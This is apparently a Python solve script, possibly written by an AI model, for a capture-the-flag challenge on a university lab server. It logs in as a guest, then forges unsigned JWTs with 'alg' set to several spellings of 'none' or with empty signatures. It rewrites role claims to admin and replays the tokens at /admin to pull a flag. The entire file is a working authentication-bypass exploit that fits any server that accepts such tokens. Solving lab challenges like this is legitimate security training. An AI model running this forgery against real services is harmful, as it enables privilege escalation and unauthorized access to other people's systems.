"""
Token of Trust - JWT 'alg:none' (and friends) privilege escalation.

The vault hands out a JWT at login and trusts it for /admin. We never need the
secret key: if the server honors alg="none" (or doesn't really verify), we can
rewrite the payload to make ourselves admin and present an unsigned token.

The script:
  1. logs in to get the guest token (tries the common login shapes),
  2. decodes header/payload,
  3. forges admin tokens with several no-key tricks,
  4. replays them at /admin the same way the token was delivered (Bearer or cookie),
  5. prints everything and flags a cns{...}.

Usage: python3 solve.py
"""
import base64
import json
import re
from http.client import HTTPConnection

HOST = "cns-test.idlab.uantwerpen.be"
PORT = 50009


def req(method, path, body=None, headers=None):
    conn = HTTPConnection(HOST, PORT, timeout=15)
    conn.request(method, path, body=body, headers=headers or {})
    r = conn.getresponse()
    data = r.read().decode(errors="replace")
    setcookie = r.getheader("Set-Cookie")
    conn.close()
    return r.status, data, setcookie


def b64url_decode(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def b64url_encode(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def find_jwt(text):
    m = re.search(r"[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*", text or "")
    return m.group() if m else None


def login():
    """Return (token, delivery) where delivery is 'cookie:<name>' or 'bearer'."""
    attempts = [
        ("POST", "/login", json.dumps({"username": "guest", "password": "guest"}),
         {"Content-Type": "application/json"}),
        ("POST", "/login", "username=guest&password=guest",
         {"Content-Type": "application/x-www-form-urlencoded"}),
        ("POST", "/login", json.dumps({"username": "guest"}),
         {"Content-Type": "application/json"}),
        ("GET", "/login", None, {}),
        ("GET", "/", None, {}),
        ("GET", "/token", None, {}),
    ]
    for method, path, body, headers in attempts:
        try:
            status, data, cookie = req(method, path, body, headers)
        except Exception:
            continue
        # token in a cookie?
        if cookie:
            cm = re.search(r"(\w+)=([A-Za-z0-9_\-\.]+)", cookie)
            if cm and find_jwt(cm.group(2)):
                print(f"[+] logged in via {method} {path}, token in cookie '{cm.group(1)}'")
                return cm.group(2), f"cookie:{cm.group(1)}"
        tok = find_jwt(data)
        if tok:
            print(f"[+] logged in via {method} {path}, token in body")
            return tok, "bearer"
    return None, None


def admin_payloads(payload):
    """Yield variants of the payload turned admin."""
    base = dict(payload)
    variants = []
    # flip anything that looks like a role/identity
    for key in list(base):
        if isinstance(base[key], str) and base[key].lower() in ("guest", "user"):
            v = dict(base); v[key] = "admin"; variants.append(v)
    # set common admin flags
    for key, val in [("role", "admin"), ("admin", True), ("is_admin", True),
                     ("isAdmin", True), ("user", "admin"), ("username", "admin"),
                     ("sub", "admin"), ("account", "admin")]:
        v = dict(base); v[key] = val; variants.append(v)
    # one that sets several at once
    combo = dict(base)
    combo.update({"role": "admin", "admin": True, "is_admin": True})
    variants.append(combo)
    # de-dup
    seen, out = set(), []
    for v in variants:
        key = json.dumps(v, sort_keys=True)
        if key not in seen:
            seen.add(key); out.append(v)
    return out


def forge(header, payload):
    """Yield forged token strings using no-key tricks."""
    tokens = []
    for alg in ["none", "None", "NONE", "nOnE"]:
        h = dict(header); h["alg"] = alg
        head_b64 = b64url_encode(json.dumps(h, separators=(",", ":")).encode())
        pay_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        tokens.append(f"{head_b64}.{pay_b64}.")        # empty signature
    # also: keep original header but empty/missing signature (broken verifiers)
    head_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    pay_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    tokens.append(f"{head_b64}.{pay_b64}.")
    return tokens


def try_admin(token, delivery):
    if delivery.startswith("cookie:"):
        name = delivery.split(":", 1)[1]
        headers = {"Cookie": f"{name}={token}"}
    else:
        headers = {"Authorization": f"Bearer {token}"}
    status, data, _ = req("GET", "/admin", None, headers)
    return status, data


def main():
    token, delivery = login()
    if not token:
        print("Could not obtain a token. Paste GET / and the login response and I'll adjust.")
        return
    header_b64, payload_b64 = token.split(".")[:2]
    header = json.loads(b64url_decode(header_b64))
    payload = json.loads(b64url_decode(payload_b64))
    print(f"[+] header  = {header}")
    print(f"[+] payload = {payload}")
    print(f"[+] delivery = {delivery}\n")

    # Baseline: confirm the guest token is accepted and see what /admin says.
    print("[*] guest token at /admin:")
    s, d = try_admin(token, delivery)
    print(f"    {s}: {d.strip()[:200]}\n")

    for p in admin_payloads(payload):
        for forged in forge(header, p):
            s, d = try_admin(forged, delivery)
            flag = re.search(r"[cC][nN][sS]\{[^}]*\}", d)
            if flag or s == 200 and "admin" in d.lower():
                print(f"[+] payload {json.dumps(p)}")
                print(f"    header alg -> {json.loads(b64url_decode(forged.split('.')[0]))['alg']}")
                print(f"    {s}: {d.strip()[:300]}")
                if flag:
                    print(f"\n==================\nFLAG: {flag.group()}\n==================")
                    return
    print("No forgery got in. Paste the header/payload above and I'll refine (maybe alg-confusion).")


if __name__ == "__main__":
    main()
